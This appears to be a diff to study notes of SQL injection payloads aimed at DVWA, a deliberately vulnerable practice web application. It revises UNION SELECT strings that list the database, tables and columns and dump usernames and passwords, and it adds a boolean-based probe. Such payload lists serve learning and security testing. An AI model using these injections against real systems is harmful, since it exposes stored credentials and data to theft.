@@ -25,15 +25,15 @@ export TOKEN=YOUR_COOKIE
 ```
 - Get database name
 ```
-' UNION SELECT DATABASE(), DATABASE()
+' UNION SELECT null, DATABASE() #
 ```
 - Get table_names
 ```
-' UNION SELECT table_name, table_name FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa' #
+' UNION SELECT null, table_name FROM information_schema.tables WHERE table_type='BASE TABLE' AND table_schema = 'dvwa' #
 ```
 - Get column_names
 ```
-' UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_name = 'users'#
+' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name = 'users'#
 ```
 
 ### SQLite
@@ -53,3 +53,9 @@ export TOKEN=YOUR_COOKIE
 ' union select null, username, password from users --
 ```
 
+
+## Boolean
+
+```
+' and 1=2--
+```
